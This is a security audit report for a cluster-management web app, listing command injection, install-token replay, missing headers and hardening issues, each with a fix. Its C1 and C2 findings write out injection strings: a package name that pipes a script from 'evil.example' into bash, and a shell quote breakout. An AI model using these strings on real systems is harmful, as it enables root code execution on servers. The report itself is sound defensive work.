# Security audit — scicom-aura

**Date**: 2026-04-29
**Scope**: Full repository (`web/`, `agent/`, `lib/`, `Dockerfile`s, `docker-compose*.yml`, k8s manifest hints) + live probe of `localhost:3001` running on the dev compose stack.
**Method**: Three parallel static-analysis passes (command-injection / SSRF, authentication / authorization, secrets / files / dependencies / Docker) + manual unauthenticated probing of the running dev instance.

---

## TL;DR

| Severity | Count | Highlights |
|---|---|---|
| **Critical** | **3** | apt-get-remove command injection (admin auth required, but admin compromise = root on every worker), shell-quote bypass in Prometheus proxy, install-token replay |
| **High** | **6** | Unauthenticated `/api/metrics` recon (live-probe), no security headers, missing JWT-secret fail-fast, RBAC overly restrictive on Prometheus proxy, unsafe `JSON.stringify`-in-bash, base-image hardening |
| **Medium** | **8** | Cookie flags depend on `NODE_ENV`, Bearer token comparison non-constant-time, PATCH job leaks cookies to internal fetch, predictable tmp paths for SSH keys, etc. |
| **Low / Info** | **10+** | Audit-log gaps on reads, Keycloak role lag, framework-version disclosure |

The codebase is **structurally sound** — Prisma everywhere (no SQL injection), proper SSH-key file modes, NextAuth handling cookies + CSRF correctly, no `eval`/`vm` usage, sensible per-route auth checks. Risks are concentrated in two places:

1. **Shell scripts built from admin-controlled JSON** (package names, paths, ports). Currently admin-only, but admin compromise expands to root-on-every-worker because these run via SSH.
2. **Production-deployment posture** — secrets stability (`AUTH_SECRET`), Docker hardening, `/api/metrics` defaulting to public, missing security headers.

The detailed per-area reports live alongside this file:

- [`findings/cmdinj-ssrf.md`](findings/cmdinj-ssrf.md) — command injection + SSRF
- [`findings/authn-authz.md`](findings/authn-authz.md) — auth / session / CSRF
- [`findings/secrets-files-deps.md`](findings/secrets-files-deps.md) — secrets / files / deps / Docker
- [`findings/live-probe.md`](findings/live-probe.md) — what `curl` against `localhost:3001` revealed

---

## Critical findings (do these first)

### C1. Command injection via package names — `/api/clusters/[id]/packages`

**Where**: `web/app/api/clusters/[id]/packages/route.ts:129`. Admin posts `{ packages: ["foo && curl evil.example/x.sh | bash; bar"] }`; the names are spliced unquoted into a heredoc that runs `apt-get remove -y -qq ${pkgList}` over SSH on every worker as root.

**Mitigations in place**: middleware gates POST/PUT/DELETE on `/api/clusters/*` to ADMIN role. Threat model is "admin compromise / insider".

**Fix**: shell-quote each package name (`printf '%q '` or wrap in `"…"`), or pass via a Bash array `${arr[@]}` instead of word-splitting.

### C2. Shell-quote bypass in Prometheus proxy

**Where**: `web/app/api/clusters/[id]/prometheus/[...path]/route.ts:86,104,130` — `shellQuote()` wraps the URL/body in single quotes but the resulting `cmd` is then re-interpreted by the remote shell. Embedding `'; whoami; echo '` in a POST body breaks out of the quote context.

**Threat model**: any session user (admin OR active ClusterUser) can issue queries → reaches the proxy → can execute commands as the SSH user on the controller (which is typically root via sudo for our scripts). This raises the bar from "ADMIN" to "any authenticated cluster member".

**Fix**: Stop building the curl command with shell quoting. Either (a) switch the Prometheus proxy to use the SSH local-port-forward pattern Grafana already uses (Node `fetch` to localhost via `getGrafanaTunnel`), or (b) base64-encode the URL/body and `base64 -d` server-side.

### C3. Install-token replay — `/api/install/[token]` & `/binary`

**Where**: `web/app/api/install/[token]/route.ts:13-14`, `web/app/api/install/[token]/binary/route.ts:17`. Token expiry checked, but `installTokenUsedAt` is never set after first download. A leaked install URL can be replayed until expiry, downloading both the install script and the agent binary an unlimited number of times.

**Fix**: On first hit (script OR binary) set `installTokenUsedAt = now()` atomically (Prisma `update` with a `where: { installTokenUsedAt: null }` guard) and 410 Gone subsequent requests. Audit-log the claim.

---

## High findings

### H1. `/api/metrics` is public by default

(See `findings/live-probe.md` L1.) `process.env.METRICS_TOKEN` is unset in dev compose; the live `/api/metrics` discloses cluster IDs, node counts, job counts, queue state, GPU/CPU/mem totals to anyone who can hit the host. **Set the env var in both `docker-compose.dev.yml` / `docker-compose.prod.yml` and the k8s deployment.** Or move the route under `/api/admin/metrics`.

### H2. No security response headers

(L2.) No CSP, no `X-Frame-Options`, no HSTS, no `Referrer-Policy`. Add a `headers()` block in `next.config.mjs` for the global ones; CSP needs care to allow Next's inline scripts.

### H3. NextAuth secret fail-fast

`lib/auth.ts` doesn't explicitly pass `secret` and doesn't crash on boot if the env is missing. Already partially mitigated by the docker-compose alignment we did, but production should hard-fail on missing `AUTH_SECRET` rather than silently auto-generating per-pod.

### H4. RBAC overly restrictive on Prometheus proxy

A VIEWER who submitted a Job to a cluster can't see metrics for their own job unless explicitly added as a `ClusterUser`. Inverse of a security bug; just irritating UX.

### H5. `JSON.stringify`-in-bash pattern

`web/app/api/clusters/[id]/files/route.ts:93,96` interpolates `${JSON.stringify(abs)}` *inside* a bash double-quoted heredoc. `safeJoin` currently sanitises `abs`, but the pattern is fragile — JSON encoding doesn't make a value safe inside `"…"` (which still does `$()` and `\`…\``). Move the path into a single-quoted bash variable assignment and reference it as `"$VAR"`.

### H6. Container hardening

`web/Dockerfile` runs as `nextjs` user (good) but the base image (`node:20-alpine`) and Alpine version are unpinned by digest. `web/Dockerfile.dev`, agent `Dockerfile` similar. Lock to digests + add Trivy / Grype to CI.

---

## Medium findings (representative — see per-area reports)

- **M1**. Bearer-token DB lookup (`lib/api-auth.ts:55-75`) doesn't use `crypto.timingSafeEqual` at the app layer (defense-in-depth only).
- **M2**. Cookie flags rely on `NODE_ENV` defaults rather than explicit `cookies` config — explicit is safer.
- **M3**. PATCH `/jobs/[jobId]` self-fetches `/metrics/refresh-targets` and forwards browser cookies. Should use in-process call or service token.
- **M4**. SSH-key tmp-dir paths under `/tmp` are predictable per-call (`mkdtemp`, but predictable basename pattern). Mode is 0600 — fine — but worth `os.tmpdir()` + a non-guessable random suffix.
- **M5**. Password-reset endpoint discloses token validity via differential response.
- **M6**. PostgreSQL credentials hardcoded as `aura/aura` in compose files. Acceptable for dev; production should inject via secrets and not bind 5432 publicly.
- **M7**. `--break-system-packages` + loose Ansible pin in install scripts.
- **M8**. No CORS / CSP — `Access-Control-Allow-Origin` not set anywhere (good; defaults block cross-origin) but documenting the policy in code makes accidental relaxations obvious.

---

## Low / Info

- Audit log gaps on read paths (job stdout, prometheus queries).
- Keycloak role revocation lag (cached in DB, not pulled from IdP per request).
- `X-Powered-By: Next.js` header — `poweredByHeader: false` in `next.config.mjs`.
- `/api/auth/providers` discloses login providers (NextAuth standard behaviour).
- Bearer-token API susceptible to plain-HTTP leak if a client misconfigures.
- Docker base images unpinned by digest.

---

## Verified safe (won't surprise you)

- **CSRF** — NextAuth manages a csrf-token cookie + session validation; our routes use `auth()` which checks the cookie not just the origin.
- **Header smuggling** (`X-Forwarded-User`, `X-Original-URL`) — middleware ignores these and uses NextAuth's normalised session.
- **SQL injection** — Prisma everywhere; no raw queries on user input.
- **Open redirect** — NextAuth allowlists `callbackUrl`; our app routes don't accept arbitrary redirect targets.
- **Path traversal in URL** — cluster IDs that include `..` cleanly 401 (no 500 / stack trace, no Prisma weirdness).
- **Unauth state-changing POSTs** — every one I tested returns 401.
- **CORS preflight** — `Origin: https://evil.example` requests get 401.

---

## Caveats / corrections to subagent reports

- **`web/.env` is git-ignored**, not committed. The third agent's "Critical #1 — Hardcoded Keycloak Secret in Version Control" is a **false positive**: only `web/.env.example` is in git (verified with `git ls-files`). The secret on the local dev box is still a good thing to rotate regularly, but it's not a Git-history leak.
- **Middleware operator-precedence ambiguity** (auth report Critical #2) is more "code-clarity" than a vulnerability — the parsed expression matches the intended behaviour. Treat as code-quality (add explicit parens + comment) rather than a bug.
- **Cmd-injection report Critical #3** (`JSON.stringify`-in-bash) — current `safeJoin` sanitisation makes this not exploitable today; ranked High in this consolidation rather than Critical.

---

## Recommended order of fixes

1. **C2 → C1 → C3** in that order (proxy is most exploitable, packages needs admin, install-token needs token leak first).
2. **H1 → H2** (one-line config changes, big posture improvement).
3. **H3** (boot-time fail-fast on missing `AUTH_SECRET` in prod).
4. **H5 / M3 / M4** (tighten the small fragility patterns).
5. Compose / Dockerfile hardening as part of the next prod-image bump.

The detailed reports under `findings/` have file:line references and code snippets for each item.
